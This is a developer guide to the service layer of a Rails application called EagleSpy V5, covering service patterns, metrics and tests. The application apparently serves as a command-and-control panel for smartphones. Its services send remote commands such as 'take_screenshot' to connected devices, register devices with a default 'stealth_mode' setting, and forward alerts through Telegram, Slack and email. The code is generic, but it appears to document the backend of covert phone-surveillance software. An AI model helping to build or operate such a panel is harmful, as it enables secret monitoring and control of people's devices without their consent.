# Service Layer Guide

## Overview

EagleSpy V5 uses a structured service layer built on two core concerns:
**ServiceInterface** and **DependencyInjectable**. All new services should
include these modules to ensure consistent behaviour, logging, metrics, and
testability.

## Core Concerns

### ServiceInterface (`app/services/concerns/service_interface.rb`)

Provides:

| Feature | Description |
|---------|-------------|
| `.call` class method | Instantiates the service and invokes `#call` |
| **Result pattern** | Returns `Result.success(value)` or `Result.failure(error)` |
| **Automatic logging** | Errors are logged via `StructuredLogger` |
| **Metrics tracking** | Counters and histograms via `MetricsService` |

#### Usage

```ruby
class MyService
  include ServiceInterface

  def initialize(foo:)
    @foo = foo
  end

  def call
    return failure("missing foo") if @foo.blank?
    success(do_work(@foo))
  end
end

result = MyService.call(foo: "bar")
result.success? # => true
result.value    # => computed value
```

### DependencyInjectable (`app/services/concerns/dependency_injectable.rb`)

Provides:

| Feature | Description |
|---------|-------------|
| `dependency` DSL | Declare named dependencies with lazy defaults |
| Constructor injection | Override defaults via keyword args |
| Lazy initialization | Default procs are evaluated on first access |
| Test double support | Pass fakes/mocks in tests |

#### Usage

```ruby
class MyService
  include DependencyInjectable

  dependency :notifier, default: -> { SlackNotifier.new(config) }
  dependency :logger,   default: -> { StructuredLogger }

  def initialize(data:, **deps)
    @data = data
    inject_dependencies(deps)
  end
end

# Production — uses defaults:
MyService.new(data: payload)

# Test — inject doubles:
fake = double("notifier", send_alert: { status: "sent" })
MyService.new(data: payload, notifier: fake)
```

## Services

### CommandExecutionService

**Responsibility:** Execute a command against a connected device.

**Pipeline:** validate → create PendingCommand → broadcast via ActionCable → track metrics.

```ruby
result = CommandExecutionService.call(
  smartphone: device,
  command: "take_screenshot",
  params: { quality: 80 }
)

if result.success?
  pending_command = result.value
end
```

### DeviceRegistrationService

**Responsibility:** Register or update a device with token validation.

```ruby
result = DeviceRegistrationService.call(
  device_id: "abc123",
  device_token: ENV["DEVICE_AUTH_TOKEN"],
  attributes: {
    device_name: "Pixel 7",
    operating_system: "Android 14",
    ip_address: "192.168.1.50"
  }
)
```

Initialises default settings (`command_poll_interval`, `stealth_mode`, etc.)
for newly registered devices.

### NotificationDeliveryService

**Responsibility:** Deliver alert notifications through multiple channels.

Supported channels: `email`, `webhook`, `slack`, `telegram`.

```ruby
result = NotificationDeliveryService.call(
  alert: alert,
  channels: ["slack", "email"]  # optional — defaults to all enabled
)
```

Features:
- Strategy pattern for channel selection
- Per-channel retry with exponential backoff (1s → 5s → 15s)
- Delivery confirmation tracking
- Graceful handling when channels are unavailable

#### Configuration

Channels are configured in `config/notifications.yml` or via Rails credentials:

```yaml
production:
  slack:
    enabled: true
    webhook_url: "https://hooks.slack.com/..."
  email:
    enabled: true
    to: "alerts@example.com"
  webhook:
    enabled: false
    url: "https://api.example.com/webhook"
```

## Result Object

The `Result` class (`app/services/result.rb`) wraps service outcomes:

```ruby
result = Result.success(user)
result.success? # => true
result.value    # => user

result = Result.failure("not found")
result.failure? # => true
result.error    # => "not found"
```

## Metrics

All services automatically track:

- `service_calls_total{service, status}` — counter per call
- `service_duration_seconds{service}` — histogram of call duration

View metrics at `GET /metrics` (Prometheus format).

## Testing

```ruby
RSpec.describe CommandExecutionService do
  let(:broadcaster) { double("broadcaster", broadcast: true) }
  let(:device) { create(:smartphone, device_id: "test-123") }

  it "executes a valid command" do
    result = CommandExecutionService.call(
      smartphone: device,
      command: "take_screenshot",
      broadcaster: broadcaster
    )

    expect(result).to be_success
    expect(result.value).to be_a(PendingCommand)
  end
end
```
